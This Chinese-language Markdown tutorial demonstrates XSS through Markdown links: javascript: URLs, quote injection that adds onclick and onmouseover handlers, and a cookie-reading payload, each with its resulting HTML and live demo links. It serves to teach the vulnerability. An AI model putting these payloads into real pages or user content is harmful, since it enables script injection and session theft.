# Markdown XSS 連結攻擊


## 執行 JavaScript alert

***程式碼***

```markdown
[執行 JavaScript alert][1]
[1]: javascript:alert(123);
```

***產生 Markdown HTML***

```html
<a href="javascript:alert(123);" target="_blank">執行 JavaScript alert</a>
```

***Demo***

[執行 JavaScript alert][1]






## 滑鼠點擊事件

***程式碼***

```markdown
[滑鼠點擊事件][2]
[2]: http://www.googl.com.tw/#"onclick='alert(123)'
```

***產生 Markdown HTML***

```html
<a href="http://www.googl.com.tw/#" onclick='alert(123)' target="_blank">滑鼠點擊事件</a>
```

***Demo***

[滑鼠點擊事件][2]

> 在 gitbook 有將特殊字元 " 字串轉換成無法執行的 ```&quot;```，所以 gitbook 沒有這方面的漏洞







## 滑鼠滑過事件

***程式碼***

```markdown
[滑鼠滑過事件][3]
[3]: http://www.googl.com.tw/#"onmouseover='alert(123)'
```

***產生 Markdown HTML***

```html
<a href="http://www.googl.com.tw/#" onmouseover='alert(123)' target="_blank">滑鼠滑過事件</a>
```

***Demo***

[滑鼠滑過事件][3]

> 在 gitbook 有將特殊字元 " 字串轉換成無法執行的 ```&quot;```，所以 gitbook 沒有這方面的漏洞








### 擷取你的 cookie

```markdown
[擷取你的 cookie][4]
[4]: javascript:document.cookie='yourcookie=這是你的cookie';alert(document.cookie);
```

***產生 Markdown HTML***

```html
<a href="javascript:document.cookie='yourcookie=這是你的cookie';alert(document.cookie);" target="_blank">擷取你的 cookie</a>
```

***Demo***

[擷取你的 cookie][4]


## 參考資料
* [XSS等web安全漏洞的防范](http://deadhorse.me/nodejs/2012/09/20/xss_in_cnode.html)



[1]: javascript:alert(123);
[2]: http://www.googl.com.tw/#"onclick='alert(123)'
[3]: http://www.googl.com.tw/#"onmouseover='alert(123)'
[4]: javascript:document.cookie='yourcookie=這是你的cookie';alert(document.cookie);